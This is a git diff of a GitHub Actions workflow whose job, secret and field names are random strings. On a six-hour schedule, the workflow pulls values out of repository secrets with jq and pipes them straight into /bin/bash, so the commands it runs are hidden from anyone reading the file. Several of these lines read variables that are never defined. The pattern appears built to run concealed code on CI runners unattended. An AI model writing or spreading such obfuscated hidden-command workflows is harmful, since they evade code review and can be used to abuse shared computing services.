@@ -2,7 +2,8 @@ name: sunxinniang4817
 on:
   workflow_dispatch:
   schedule:
-    - cron: '49 2/6 * * *'
+    - cron: '47 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,10 +12,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: sunxinniang4817
         env:
-          ewvp381: ${{ secrets.ewvp381 }}
+          d6688: ${{ secrets.d6688 }}
         run: |
-          echo $ewvp381 | jq -r .wtb6741 | /bin/bash
-          echo $gfkhb95 | jq -r .hs8 | /bin/bash
-          echo $jfvzm4 | jq -r .utyrz84577 | /bin/bash
-          echo $tpuw9116 | jq -r .v90600 | /bin/bash
+          echo $d6688 | jq -r .vthi7393 | /bin/bash
+          echo $y5920 | jq -r .z33592 | /bin/bash
+          echo $ud2417 | jq -r .mynm85912 | /bin/bash
+          echo $l6738 | jq -r .d569 | /bin/bash
+          echo $n625 | jq -r .py437 | /bin/bash
+          echo $bw83 | jq -r .mamv2 | /bin/bash
+          echo $v01749 | jq -r .kuix30251 | /bin/bash
+          echo $rxzu0407 | jq -r .qoqa58 | /bin/bash
 
